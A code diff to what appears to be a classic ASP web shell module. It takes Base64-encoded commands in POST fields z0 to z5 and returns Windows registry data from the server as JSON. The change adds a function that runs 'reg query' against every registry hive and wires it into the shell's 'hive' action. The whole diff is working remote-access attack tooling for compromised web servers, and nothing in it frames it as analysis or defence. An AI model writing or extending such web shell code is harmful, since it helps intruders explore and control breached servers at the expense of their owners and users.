@@ -89,6 +89,31 @@ Function Stream_BinaryToString(binary, charset)
     Set stream = Nothing
 End Function
 
+Function CheckHives()
+    Dim hives, hive, output, ret, jsonParts
+    ' Array of the five standard registry hives
+    hives = Array("HKEY_CLASSES_ROOT", "HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE", "HKEY_USERS", "HKEY_CURRENT_CONFIG")
+    
+    Dim partsList
+    Set partsList = CreateObject("Scripting.Dictionary")
+    
+    Dim i : i = 0
+    For Each hive In hives
+        ret = RunReg("reg query """ & hive & """ /v *", output)
+        
+        If ret = 0 Or ret = 1 Then
+            partsList.Add i, """" & hive & """:true"
+        Else
+            partsList.Add i, """" & hive & """:false"
+        End If
+        i = i + 1
+    Next
+    
+    ' Join the array to build a clean JSON object structure without trailing commas
+    CheckHives = "{" & Join(partsList.Items, ",") & "}"
+    Set partsList = Nothing
+End Function
+
 Function ScanRegistry(base_path)
     Dim output, ret, json, outLine, i
     Dim regExKey, regExVal, matches, subkeysStr, valuesStr
@@ -183,15 +208,16 @@ Response.ContentType = "application/json"
 Response.CharSet = "utf-8"
 
 Dim action, z2, z3, z4, z5
-action = Base64Decode(Request.Form("z0"))
-z2     = Base64Decode(Request.Form("z2"))
-z3     = Base64Decode(Request.Form("z3"))
-z4     = Base64Decode(Request.Form("z4"))
-z5     = Base64Decode(Request.Form("z5"))
+action  = Base64Decode(Request.Form("z0"))
+z1      = Base64Decode(Request.Form("z1"))
+z2      = Base64Decode(Request.Form("z2"))
+z3      = Base64Decode(Request.Form("z3"))
+z4      = Base64Decode(Request.Form("z4"))
+z5      = Base64Decode(Request.Form("z5"))
 
 Select Case action
     Case "hive"
-        Response.Write "{""HKEY_CLASSES_ROOT"":true,""HKEY_CURRENT_USER"":true,""HKEY_LOCAL_MACHINE"":true,""HKEY_USERS"":true,""HKEY_CURRENT_CONFIG"":true}"
+        Response.Write CheckHives()
         
     Case "scan"
         Response.Write ScanRegistry(z2)
